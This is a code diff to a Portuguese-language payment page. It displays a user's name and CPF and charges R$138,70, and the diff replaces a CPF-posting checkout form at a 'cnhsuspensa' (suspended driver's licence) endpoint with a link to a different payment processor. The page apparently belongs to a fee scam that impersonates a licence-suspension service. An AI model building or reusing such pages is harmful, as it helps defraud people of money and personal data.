@@ -62,16 +62,12 @@
             <span>R$138,70</span>
           </div>
 
-          <form action="https://checkout.zyonpay.com/pl/cnhsuspensa" method="POST">
-            <input type="hidden" name="_token" value="WIsqJnYpyCMDryROcAbrK1cgywKr2Tc3gAJI0Uq3" autocomplete="off">
-            <input type="hidden" name="cpf" id="form-cpf" value="">
-
-            <div class="w-100 px-0 d-flex justify-content-end">
-              <button class="btn-cta mt-3" type="submit">
-                Gerar Pagamento
-              </button>
-            </div>
-          </form>
+          <!-- Botão simples para redirecionar -->
+          <div class="w-100 px-0 d-flex justify-content-end">
+            <a href="https://pay.risepay.com.br/Pay/0d448d8831e64237a1cdbd9ba1948067" class="btn-cta mt-3" target="_blank" rel="noopener noreferrer">
+              Gerar Pagamento
+            </a>
+          </div>
         </div>
       </div>
     </section>
@@ -86,7 +82,6 @@
       if (userData) {
         document.getElementById('nome').innerText = userData.nome || 'Nome não disponível';
         document.getElementById('cpf').innerText = userData.cpf || 'CPF não disponível';
-        document.getElementById('form-cpf').value = userData.cpf || '';
       } else {
         alert("Nenhum dado encontrado. Retorne à página anterior.");
         window.location.href = "../entrar.html";
